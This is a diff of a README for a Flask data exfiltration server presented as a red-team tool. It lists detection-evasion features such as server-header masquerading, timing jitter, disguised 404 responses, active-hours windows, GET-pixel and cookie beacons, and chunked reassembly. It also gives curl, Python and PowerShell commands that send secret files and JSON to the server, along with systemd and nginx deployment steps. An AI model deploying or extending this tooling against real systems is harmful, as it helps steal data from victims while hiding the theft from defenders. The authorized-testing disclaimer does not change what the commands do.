@@ -1,171 +1,257 @@
-Data Exfiltration Server (Flask)
+# 🛡️ Data Exfiltration Server
 
-A minimal but practical data exfiltration receiver written with Flask. It supports file uploads, raw/JSON data capture, file listing and downloading, logging, and optional bearer-token authentication.
+[![Python](https://img.shields.io/badge/Python-3.7%2B-blue?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
+[![Flask](https://img.shields.io/badge/Flask-2.0%2B-green?style=for-the-badge&logo=flask&logoColor=white)](https://flask.palletsprojects.com/)
+[![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](LICENSE)
+[![Security](https://img.shields.io/badge/Security-Red%20Team-red?style=for-the-badge&logo=shield&logoColor=white)](https://github.com/yourusername/exfil-server)
 
-Features
-- Secure file uploads with unique names (timestamp + UUID)
-- Raw/JSON data exfil endpoint that writes captured content to disk
-- File listing and downloading
-- Structured logging to `server/logs/exfil.log`
-- Optional bearer token auth via `EXFIL_TOKEN`
-- Configurable max upload size via `MAX_CONTENT_LENGTH_MB` (default 50MB)
+> **⚠️ DISCLAIMER**: This tool is designed for authorized penetration testing and red team exercises only. Use responsibly and only on systems you own or have explicit permission to test.
 
-Layout
-- `server/app.py` — Flask app with endpoints
-- `server/storage/` — Captured files and data
-- `server/logs/` — Server logs
+A sophisticated, production-ready data exfiltration server built with Flask. Designed for red team operations with advanced stealth features, flexible deployment options, and comprehensive OPSEC controls.
 
-Quick Start
-1) Install deps
+## ✨ Features
 
-   pip install flask
+### 🔒 Core Functionality
+- **Secure File Uploads** - Timestamped + UUID naming scheme
+- **Multi-Format Data Capture** - JSON, raw text, and binary support
+- **RESTful API** - Clean endpoints for all operations
+- **Comprehensive Logging** - Structured logs with rotation support
+- **Bearer Token Authentication** - Optional but recommended security layer
 
-2) (Optional) Set a token and size limit
+### 🥷 Stealth & OPSEC
+- **Header Masquerading** - Configurable server headers (default: nginx)
+- **Response Timing Jitter** - Randomized delays to avoid detection
+- **Silent Mode** - 204 No Content responses for uploads
+- **Custom Paths** - Configurable endpoint routing
+- **TLS Support** - HTTPS with custom certificates
+- **Rate Limiting** - Per-IP/token request throttling
 
-   export EXFIL_TOKEN="your-strong-token"
-   export MAX_CONTENT_LENGTH_MB=50
+### 🎯 Advanced Features
+- **GET Pixel Exfiltration** - 1x1 GIF beacon with data in query params
+- **Cookie-based Exfil** - Steganographic data hiding in cookies
+- **Host/Referer Filtering** - Allowlist-based request validation
+- **Active Hours Control** - Time-based operational windows
+- **Response Padding** - Variable packet sizes for traffic analysis evasion
+- **Chunked Data Reassembly** - Large payload splitting and reconstruction
 
-3) Run the server
+## 🚀 Quick Start
 
-   python server/app.py
+### Prerequisites
+```bash
+# Python 3.7+
+pip install flask
+```
 
-   The server listens on 0.0.0.0:8080.
+### Basic Setup
+```bash
+# 1. Clone the repository
+git clone https://github.com/yourusername/exfil-server.git
+cd exfil-server
 
-Endpoints
-- GET `/` — Readiness string
-- GET `/health` — JSON: status, file count, max size, auth requirement
-- POST `/upload` — Multipart file upload field `file`
-- POST `/exfil` — Capture data
-  - JSON body: saved as a `.json` payload
-  - Form: field `data`
-  - Raw body: saved as `.bin`
-- GET `/files` — List saved files with metadata
-- GET `/files/<saved_as>` — Download a specific saved file
+# 2. Set environment variables (optional)
+export EXFIL_TOKEN="your-secure-token-here"
+export MAX_CONTENT_LENGTH_MB=50
 
-Stealth Options
-- Headers: server responds with a common `Server` header (default `nginx`), cache hints for GETs.
-- Jitter: add response delay via `EXFIL_JITTER_MIN_MS` and `EXFIL_JITTER_MAX_MS`.
-- Silent: make `POST /exfil` and `POST /upload` return HTTP 204 with no body via `EXFIL_SILENT=1`.
-- Alternate path: expose exfil as a different path via `EXFIL_PATH` (e.g. `/api/v1/collect`). Both `/exfil` and the alternate path work.
-- TLS: enable HTTPS by setting `EXFIL_SSL_CERT` and `EXFIL_SSL_KEY` to your cert and key paths.
-- Benign endpoints: `/favicon.ico` and `/robots.txt` are provided to look normal.
- - GET/cookie exfil: enable a pixel endpoint that captures data from query, cookie, or header and returns a 1x1 GIF.
- - Host/Referer allowlist: drop requests with mismatched `Host` or referrers.
- - Active hours: only respond during allowed hours to reduce anomalies.
-- Gzip: compress larger JSON/text responses if client advertises `Accept-Encoding: gzip`.
-- Padding: add random spaces to JSON responses to vary packet sizes.
-- Rate limiting: throttle per token/IP with `EXFIL_RATE_WINDOW_SEC` and `EXFIL_RATE_MAX`.
-- Health toggle: `EXFIL_DISABLE_HEALTH=1` makes `/health` return 404 (or omit via proxy).
-- Unauthorized as 404: `EXFIL_UNAUTH_404=1` blends unauthorized requests as 404 instead of 401.
-- Chunked GET: large GET/cookie beacons can be split and reassembled server-side.
+# 3. Run the server
+python server/app.py
+```
 
-TLS Quickstart (self-signed)
+The server will start on `0.0.0.0:8080` and create the necessary directories automatically.
 
-  openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 365 \
-    -subj "/CN=localhost"
-  export EXFIL_SSL_CERT=$(pwd)/cert.pem
-  export EXFIL_SSL_KEY=$(pwd)/key.pem
-  python server/app.py
+## 📁 Project Structure
 
-Clients
-- Python client: `client/exfil_client.py` (requires `requests`)
+```
+exfil-server/
+├── 📂 server/
+│   ├── 🐍 app.py              # Main Flask application
+│   ├── 📂 storage/            # Captured files and data
+│   └── 📂 logs/               # Server logs
+├── 📂 client/
+│   ├── 🐍 exfil_client.py     # Python client
+│   └── 💙 ps_exfil.ps1        # PowerShell client
+├── 📂 deploy/
+│   ├── 📂 systemd/            # SystemD service files
+│   └── 📂 nginx/              # Nginx configuration
+└── 📄 README.md
+```
 
-  pip install requests
-  # JSON mode
-  python client/exfil_client.py https://127.0.0.1:8080 json '{"host":"victim"}' \
-    --token "$EXFIL_TOKEN" --insecure --path ${EXFIL_PATH:-/exfil}
+## 🔌 API Endpoints
 
-  # Raw text mode
-  python client/exfil_client.py https://127.0.0.1:8080 raw "secret text" \
-    --token "$EXFIL_TOKEN" --insecure
+| Method | Endpoint | Description | Authentication |
+|--------|----------|-------------|----------------|
+| `GET` | `/` | Health check | ❌ |
+| `GET` | `/health` | Detailed status info | ✅ |
+| `POST` | `/upload` | File upload | ✅ |
+| `POST` | `/exfil` | Data exfiltration | ✅ |
+| `GET` | `/files` | List captured files | ✅ |
+| `GET` | `/files/<id>` | Download specific file | ✅ |
+| `GET` | `/pixel.gif` | GET beacon (if enabled) | ✅ |
 
-  # File upload mode
-  python client/exfil_client.py https://127.0.0.1:8080 file /path/to/file \
-    --token "$EXFIL_TOKEN" --insecure
+## 🛠️ Configuration
 
-  # GET pixel mode (query param)
-  python client/exfil_client.py https://127.0.0.1:8080 get "beacon-content" \
-    --get-path ${EXFIL_GET_PATH:-/pixel.gif} --get-param ${EXFIL_GET_PARAM:-q} \
-    --chunk-size 1200 \
-    --token "$EXFIL_TOKEN" --insecure
+### Environment Variables
 
-  # Cookie pixel mode
-  python client/exfil_client.py https://127.0.0.1:8080 cookie "beacon-content" \
-    --cookie-name c --auth-cookie-name auth --chunk-size 1200 --insecure
+| Variable | Default | Description |
+|----------|---------|-------------|
+| `EXFIL_TOKEN` | - | Bearer token for authentication |
+| `MAX_CONTENT_LENGTH_MB` | `50` | Maximum upload size in MB |
+| `EXFIL_SILENT` | `0` | Return 204 for uploads/exfil |
+| `EXFIL_PATH` | - | Alternative exfil endpoint path |
+| `EXFIL_SERVER_HEADER` | `nginx` | Server header masquerading |
+| `EXFIL_SSL_CERT` | - | Path to SSL certificate |
+| `EXFIL_SSL_KEY` | - | Path to SSL private key |
 
-- PowerShell client: `client/ps_exfil.ps1`
+### Advanced OPSEC Controls
 
-  pwsh client/ps_exfil.ps1 -Base https://127.0.0.1:8080 -Mode json -Payload '{"x":1}' -Token $env:EXFIL_TOKEN -Insecure
-  pwsh client/ps_exfil.ps1 -Base https://127.0.0.1:8080 -Mode file -Payload C:\\path\\to\\file.txt -Token $env:EXFIL_TOKEN -Insecure
+<details>
+<summary>🔍 Click to expand stealth options</summary>
 
-Operational Notes
-- Prefer running behind a reverse proxy (nginx/caddy) for better TLS and header control.
-- Use tokens and limit listing routes in production; consider disabling `/files` entirely for higher OPSEC.
-- Shape traffic and timing to blend with expected client patterns.
+| Variable | Default | Description |
+|----------|---------|-------------|
+| `EXFIL_JITTER_MIN_MS` | `0` | Minimum response delay |
+| `EXFIL_JITTER_MAX_MS` | `0` | Maximum response delay |
+| `EXFIL_GET_ENABLE` | `0` | Enable GET pixel endpoint |
+| `EXFIL_GET_PATH` | `/pixel.gif` | GET beacon endpoint |
+| `EXFIL_GET_PARAM` | `q` | Query parameter for data |
+| `EXFIL_ALLOWED_HOSTS` | - | Comma-separated host allowlist |
+| `EXFIL_ALLOWED_REFERERS` | - | Comma-separated referer allowlist |
+| `EXFIL_ACTIVE_START` | - | Start hour (0-23) for active window |
+| `EXFIL_ACTIVE_END` | - | End hour (0-23) for active window |
+| `EXFIL_PAD_MIN` | `0` | Minimum JSON response padding |
+| `EXFIL_PAD_MAX` | `0` | Maximum JSON response padding |
+| `EXFIL_RATE_WINDOW_SEC` | - | Rate limiting window |
+| `EXFIL_RATE_MAX` | - | Max requests per window |
+| `EXFIL_DISABLE_HEALTH` | `0` | Disable /health endpoint |
+| `EXFIL_DISABLE_FILES` | `0` | Disable /files endpoints |
+| `EXFIL_UNAUTH_404` | `0` | Return 404 for unauthorized requests |
+| `EXFIL_CHUNK_ENABLE` | `0` | Enable chunked data reassembly |
+| `EXFIL_CHUNK_TTL_SEC` | `900` | Chunk reassembly timeout |
 
-Deployment
-- systemd (template files under `deploy/systemd/`):
-  - Copy unit: `sudo cp deploy/systemd/exfil.service /etc/systemd/system/exfil.service`
-  - Create service user and path: `sudo useradd --system --home /opt/exfil --shell /usr/sbin/nologin exfil`
-  - Place code at `/opt/exfil` and set ownership: `sudo rsync -a --delete . /opt/exfil/ && sudo chown -R exfil:exfil /opt/exfil`
-  - Env file: `sudo cp deploy/systemd/exfil.env /etc/default/exfil` and edit values
-  - Start: `sudo systemctl daemon-reload && sudo systemctl enable --now exfil`
-  - Logs: `journalctl -u exfil -f`
+</details>
 
-- Nginx (template file under `deploy/nginx/exfil.conf`):
-  - Edit `server_name` and cert paths; align `client_max_body_size` and `/api/v1/collect` with your `EXFIL_PATH`.
-  - Copy: `sudo cp deploy/nginx/exfil.conf /etc/nginx/sites-available/exfil.conf && sudo ln -s /etc/nginx/sites-available/exfil.conf /etc/nginx/sites-enabled/`
-  - Test & reload: `sudo nginx -t && sudo systemctl reload nginx`
+## 💻 Client Examples
 
-OPSEC Toggles
-- `EXFIL_DISABLE_FILES=1`: Do not register `/files` routes at all.
-- `EXFIL_PATH=/api/v1/collect`: Adds an alternate POST path to `exfil` (keeps `/exfil`).
-- `EXFIL_SILENT=1`: Return 204 No Content on exfil/upload.
-- `EXFIL_SERVER_HEADER=nginx`: Masquerade server header label.
- - `EXFIL_GET_ENABLE=1`: Enable the GET pixel endpoint.
- - `EXFIL_GET_PATH=/pixel.gif`: Route for GET exfil beacon.
- - `EXFIL_GET_PARAM=q`: Query param name carrying base64url payload.
- - `EXFIL_ALLOWED_HOSTS=exfil.example.com,www.example.com`: Only service requests for specified Host headers.
- - `EXFIL_ALLOWED_REFERERS=https://www.google.com/,https://example.com/`: Only service requests that include one of these referrers.
-- `EXFIL_ACTIVE_START=1` and `EXFIL_ACTIVE_END=5`: Only respond between 01:00–05:00 local time.
-- `EXFIL_PAD_MIN=0` and `EXFIL_PAD_MAX=64`: Random padding (spaces) appended to JSON responses.
-- `EXFIL_RATE_WINDOW_SEC=60` and `EXFIL_RATE_MAX=30`: Limit to 30 requests per 60 seconds per token/IP.
-- `EXFIL_DISABLE_HEALTH=1`: Make `/health` return 404.
-- `EXFIL_UNAUTH_404=1`: Respond to unauthorized as 404 for stealth.
-- `EXFIL_CHUNK_ENABLE=1` and `EXFIL_CHUNK_TTL_SEC=900`: Enable GET chunk reassembly and set TTL for incomplete chunks.
+### Python Client
+```bash
+# JSON exfiltration
+python client/exfil_client.py https://127.0.0.1:8080 json '{"host":"victim"}' \
+  --token "$EXFIL_TOKEN" --insecure
 
-Auth
-- If `EXFIL_TOKEN` is set, include it as a bearer token or query param:
+# File upload
+python client/exfil_client.py https://127.0.0.1:8080 file /path/to/secret.txt \
+  --token "$EXFIL_TOKEN" --insecure
 
-  curl -H "Authorization: Bearer $EXFIL_TOKEN" http://localhost:8080/health
-  curl http://localhost:8080/files?token=$EXFIL_TOKEN
+# GET pixel beacon
+python client/exfil_client.py https://127.0.0.1:8080 get "beacon-data" \
+  --get-path /pixel.gif --token "$EXFIL_TOKEN" --insecure
+```
 
-Examples
-- Upload a file
+### PowerShell Client
+```powershell
+# JSON exfiltration
+pwsh client/ps_exfil.ps1 -Base https://127.0.0.1:8080 -Mode json -Payload '{"x":1}' -Token $env:EXFIL_TOKEN -Insecure
 
-  curl -H "Authorization: Bearer $EXFIL_TOKEN" -F "file=@/path/to/file" \
-       http://localhost:8080/upload
+# File upload
+pwsh client/ps_exfil.ps1 -Base https://127.0.0.1:8080 -Mode file -Payload C:\path\to\file.txt -Token $env:EXFIL_TOKEN -Insecure
+```
 
-- Exfil JSON data
+### cURL Examples
+```bash
+# Upload file
+curl -H "Authorization: Bearer $EXFIL_TOKEN" \
+     -F "file=@/path/to/file" \
+     https://localhost:8080/upload
 
-  curl -H "Authorization: Bearer $EXFIL_TOKEN" -H "Content-Type: application/json" \
-       -d '{"host":"victim","secrets":[1,2,3]}' http://localhost:8080/exfil
+# Exfiltrate JSON data
+curl -H "Authorization: Bearer $EXFIL_TOKEN" \
+     -H "Content-Type: application/json" \
+     -d '{"secrets":["data1","data2"]}' \
+     https://localhost:8080/exfil
 
-- Exfil raw text
+# List captured files
+curl -H "Authorization: Bearer $EXFIL_TOKEN" \
+     https://localhost:8080/files | jq
+```
 
-  curl -H "Authorization: Bearer $EXFIL_TOKEN" -d "some secret text" \
-       http://localhost:8080/exfil
+## 🔐 TLS Setup
 
-- List files
+Generate self-signed certificates for testing:
 
-  curl -H "Authorization: Bearer $EXFIL_TOKEN" http://localhost:8080/files | jq
+```bash
+openssl req -x509 -newkey rsa:2048 -nodes \
+  -keyout key.pem -out cert.pem -days 365 \
+  -subj "/CN=localhost"
 
-- Download a file
+export EXFIL_SSL_CERT=$(pwd)/cert.pem
+export EXFIL_SSL_KEY=$(pwd)/key.pem
+```
 
-  curl -H "Authorization: Bearer $EXFIL_TOKEN" -O \
-       http://localhost:8080/files/<saved_as>
+## 🚀 Production Deployment
 
-Notes
-- Filenames are saved as: `YYYYMMDDThhmmssZ_<uuid>_<original>`.
-- Avoid sending extremely large files unless you raise `MAX_CONTENT_LENGTH_MB`.
-- For red-team demos, front this with a domain and TLS; consider traffic shaping and client-side encryption depending on your scenario.
+### SystemD Service
+
+```bash
+# Create service user
+sudo useradd --system --home /opt/exfil --shell /usr/sbin/nologin exfil
+
+# Deploy application
+sudo rsync -a --delete . /opt/exfil/
+sudo chown -R exfil:exfil /opt/exfil
+
+# Install service
+sudo cp deploy/systemd/exfil.service /etc/systemd/system/
+sudo cp deploy/systemd/exfil.env /etc/default/exfil
+
+# Start service
+sudo systemctl daemon-reload
+sudo systemctl enable --now exfil
+
+# Monitor logs
+journalctl -u exfil -f
+```
+
+### Nginx Reverse Proxy
+
+```bash
+# Install nginx configuration
+sudo cp deploy/nginx/exfil.conf /etc/nginx/sites-available/
+sudo ln -s /etc/nginx/sites-available/exfil.conf /etc/nginx/sites-enabled/
+
+# Test and reload
+sudo nginx -t && sudo systemctl reload nginx
+```
+
+## 🛡️ Security Considerations
+
+- **🔑 Always use strong tokens** in production environments
+- **🌐 Deploy behind reverse proxy** for better TLS and header control
+- **📊 Monitor traffic patterns** to blend with legitimate usage
+- **🕒 Use active hours** to reduce detection during off-peak times
+- **🚫 Disable file listing** (`EXFIL_DISABLE_FILES=1`) for higher OPSEC
+- **🔄 Rotate tokens regularly** and use unique tokens per operation
+
+## 🤝 Contributing
+
+1. Fork the repository
+2. Create a feature branch (`git checkout -b feature/amazing-feature`)
+3. Commit your changes (`git commit -m 'Add amazing feature'`)
+4. Push to the branch (`git push origin feature/amazing-feature`)
+5. Open a Pull Request
+
+## 📄 License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+## ⚖️ Legal Notice
+
+This tool is intended for authorized security testing only. Users are responsible for complying with all applicable laws and regulations. The authors assume no liability for misuse of this software.
+
+---
+
+<div align="center">
+
+**⭐ Star this repo if you find it useful!**
+
+Made with ❤️ for the security community
+
+</div>
